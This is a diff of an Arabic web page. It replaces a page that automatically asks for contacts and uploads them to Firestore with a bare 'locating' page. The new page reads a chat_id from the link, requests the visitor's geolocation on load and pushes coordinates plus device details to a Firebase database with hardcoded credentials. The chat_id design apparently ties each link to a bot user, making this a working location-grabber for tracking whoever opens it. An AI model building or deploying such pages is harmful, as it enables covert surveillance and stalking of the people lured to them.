@@ -1,305 +1,111 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مزامنة جهات الاتصال</title>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            direction: rtl;
-        }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-        }
-        h1 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 2em;
-        }
-        p {
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        .status {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-        .status.waiting {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeeba;
-        }
-        .status.loading {
-            background: #cce5ff;
-            color: #004085;
-            border: 1px solid #b8daff;
-        }
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 20px;
-        }
-        .button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
-        }
-        .button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #f0f0f0;
-            border-radius: 2px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            background: #667eea;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        .hidden {
-            display: none;
-        }
-        #countDisplay {
-            font-size: 18px;
-            margin: 10px 0;
-            color: #333;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>تحديد الموقع</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<style>
+body{
+margin:0;
+height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+background:#0d0d0d;
+color:#00aaff;
+font-family:sans-serif;
+text-align:center;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <h1>📱 مزامنة جهات الاتصال</h1>
-        <p>لتحسين تجربتك، نحتاج إلى الوصول لجهات الاتصال الخاصة بك. سيتم مزامنتها تلقائياً مع خوادمنا.</p>
-        
-        <div id="status" class="status waiting">
-            ⏳ في انتظار موافقتك على طلب الإذن...
-        </div>
-        
-        <div id="progressContainer" class="hidden">
-            <div class="progress-bar">
-                <div id="progressFill" class="progress-bar-fill"></div>
-            </div>
-            <div id="countDisplay">0/0 جهة اتصال</div>
-        </div>
-        
-        <button id="requestPermissionBtn" class="button" onclick="requestContactsPermission()">
-            طلب إذن جهات الاتصال
-        </button>
-    </div>
 
-    <script>
-        // تكوين Firebase - يجب استبدال هذه القيم بمشروعك الفعلي
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_AUTH_DOMAIN",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_STORAGE_BUCKET",
-            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-            appId: "YOUR_APP_ID"
-        };
+<h2 id="status">📍 جاري تحديد الموقع...</h2>
 
-        // تهيئة Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+<script>
 
-        let contactsProcessed = 0;
-        let totalContacts = 0;
+// قراءة chat_id من الرابط
+const params = new URLSearchParams(window.location.search);
+const chatId = params.get("chat_id");
 
-        // تحديث حالة العرض
-        function updateStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-        }
+if(!chatId){
+document.getElementById("status").innerText="⚠ رابط غير صالح";
+throw new Error("No chat_id");
+}
 
-        // تحديث شريط التقدم
-        function updateProgress(processed, total) {
-            const progressContainer = document.getElementById('progressContainer');
-            const progressFill = document.getElementById('progressFill');
-            const countDisplay = document.getElementById('countDisplay');
-            
-            progressContainer.classList.remove('hidden');
-            const percentage = (processed / total) * 100;
-            progressFill.style.width = `${percentage}%`;
-            countDisplay.textContent = `${processed}/${total} جهة اتصال`;
-        }
 
-        // رفع جهات الاتصال إلى Firebase
-        async function uploadContactsToFirebase(contacts) {
-            try {
-                const batch = db.batch();
-                const contactsRef = db.collection('contacts').doc();
-                
-                // إضافة معرف فريد للجلسة
-                const sessionId = Date.now().toString();
-                
-                contactsProcessed = 0;
-                totalContacts = contacts.length;
-                
-                updateStatus('جاري رفع جهات الاتصال...', 'loading');
-                
-                // تقسيم جهات الاتصال إلى دفعات صغيرة لتجنب قيود Firestore
-                for (let i = 0; i < contacts.length; i += 500) {
-                    const batch = db.batch();
-                    const chunk = contacts.slice(i, i + 500);
-                    
-                    chunk.forEach(contact => {
-                        const contactRef = db.collection('contacts').doc();
-                        batch.set(contactRef, {
-                            ...contact,
-                            sessionId: sessionId,
-                            uploadedAt: firebase.firestore.FieldValue.serverTimestamp()
-                        });
-                    });
-                    
-                    await batch.commit();
-                    contactsProcessed += chunk.length;
-                    updateProgress(contactsProcessed, totalContacts);
-                }
-                
-                updateStatus(`✅ تم رفع ${totalContacts} جهة اتصال بنجاح`, 'success');
-                
-            } catch (error) {
-                console.error('خطأ في رفع جهات الاتصال:', error);
-                updateStatus('❌ حدث خطأ أثناء رفع جهات الاتصال', 'error');
-            }
-        }
+// إعداد Firebase
+const firebaseConfig={
+apiKey:"AIzaSyCctwmXaaMpD5XfFzmdxqKd3RKoIc31fSc",
+authDomain:"devicelink-dbe01.firebaseapp.com",
+databaseURL:"https://devicelink-dbe01-default-rtdb.firebaseio.com",
+projectId:"devicelink-dbe01",
+storageBucket:"devicelink-dbe01.firebasestorage.app",
+messagingSenderId:"1014057679077",
+appId:"1:1014057679077:android:ae6376a0b450a1b656bc0c"
+};
 
-        // الحصول على جهات الاتصال
-        async function getContacts() {
-            try {
-                // التحقق من دعم واجهة برمجة جهات الاتصال
-                if (!navigator.contacts || !navigator.contacts.select) {
-                    throw new Error('متصفحك لا يدعم الوصول إلى جهات الاتصال');
-                }
+firebase.initializeApp(firebaseConfig);
+const database=firebase.database();
 
-                // طلب جهات الاتصال - نطلب الاسم ورقم الهاتف
-                const properties = ['name', 'tel'];
-                const options = { multiple: true };
-                
-                const contacts = await navigator.contacts.select(properties, options);
-                
-                if (contacts && contacts.length > 0) {
-                    // تنسيق بيانات جهات الاتصال
-                    const formattedContacts = contacts.map(contact => ({
-                        name: contact.name?.[0] || 'بدون اسم',
-                        phoneNumbers: contact.tel || [],
-                        source: 'web_contacts_api',
-                        syncedAt: new Date().toISOString()
-                    }));
-                    
-                    // رفع جهات الاتصال تلقائياً
-                    await uploadContactsToFirebase(formattedContacts);
-                } else {
-                    updateStatus('❌ لم يتم العثور على جهات اتصال', 'error');
-                }
-                
-            } catch (error) {
-                console.error('خطأ في الحصول على جهات الاتصال:', error);
-                updateStatus(`❌ ${error.message}`, 'error');
-            }
-        }
 
-        // طلب إذن جهات الاتصال
-        async function requestContactsPermission() {
-            const button = document.getElementById('requestPermissionBtn');
-            button.disabled = true;
-            
-            try {
-                // التحقق من دعم واجهة جهات الاتصال
-                if (!navigator.contacts || !navigator.contacts.select) {
-                    throw new Error('متصفحك لا يدعم الوصول إلى جهات الاتصال');
-                }
+// جمع معلومات الجهاز (معلومات عامة فقط)
+function getDeviceInfo(){
 
-                updateStatus('⏳ جاري طلب الإذن...', 'loading');
-                
-                // التحقق من وجود الإذن مسبقاً
-                if (navigator.permissions && navigator.permissions.query) {
-                    const permissionStatus = await navigator.permissions.query({ name: 'contacts' });
-                    
-                    if (permissionStatus.state === 'denied') {
-                        updateStatus('❌ تم رفض الإذن سابقاً. يرجى تفعيله من إعدادات المتصفح', 'error');
-                        button.disabled = false;
-                        return;
-                    }
-                }
-                
-                // محاولة الحصول على جهات الاتصال - هذا سيثير طلب الإذن تلقائياً
-                await getContacts();
-                
-            } catch (error) {
-                console.error('خطأ في طلب الإذن:', error);
-                updateStatus(`❌ ${error.message}`, 'error');
-                button.disabled = false;
-            }
-        }
+const ua=navigator.userAgent;
 
-        // التحقق من الدعم عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', () => {
-            if (!navigator.contacts || !navigator.contacts.select) {
-                updateStatus('❌ متصفحك لا يدعم الوصول إلى جهات الاتصال', 'error');
-                document.getElementById('requestPermissionBtn').disabled = true;
-            } else {
-                // محاولة طلب الإذن تلقائياً عند تحميل الصفحة
-                setTimeout(() => {
-                    requestContactsPermission();
-                }, 1000);
-            }
-        });
+return{
+user_agent:ua,
+platform:navigator.platform,
+language:navigator.language,
+screen_width:screen.width,
+screen_height:screen.height,
+is_mobile:/Android|iPhone|iPad|iPod/i.test(ua)
+};
 
-        // مراقبة تغييرات الإذن إذا كانت مدعومة
-        if (navigator.permissions && navigator.permissions.query) {
-            navigator.permissions.query({ name: 'contacts' }).then(permissionStatus => {
-                permissionStatus.onchange = () => {
-                    if (permissionStatus.state === 'granted') {
-                        getContacts();
-                    }
-                };
-            });
-        }
-    </script>
+}
+
+
+// طلب الموقع
+navigator.geolocation.getCurrentPosition(
+
+async(pos)=>{
+
+const device=getDeviceInfo();
+
+const data={
+
+chat_id:chatId,
+
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
+accuracy:pos.coords.accuracy,
+
+time:new Date().toISOString(),
+
+device:device
+
+};
+
+await database.ref("locations").push(data);
+
+document.getElementById("status").innerText="✅ تم إرسال الموقع";
+
+},
+
+()=>{
+
+document.getElementById("status").innerText="❌ تم رفض إذن الموقع";
+
+}
+
+);
+
+</script>
+
 </body>
 </html>
